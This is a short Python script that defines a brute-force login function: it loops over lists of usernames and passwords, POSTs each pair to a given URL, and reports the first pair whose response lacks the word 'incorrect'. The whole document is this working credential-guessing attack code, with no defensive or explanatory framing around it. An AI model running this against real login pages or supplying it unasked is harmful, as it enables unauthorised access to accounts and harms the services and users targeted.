import requests

def brute_force_login(url, usernames, passwords):
    for username in usernames:
        for password in passwords:
            response = requests.post(url, data={'username': username, 'password': password})
            if "incorrect" not in response.text:
                print(f"Possible login with {username}:{password}")
                return
    print("No successful brute force login found.")
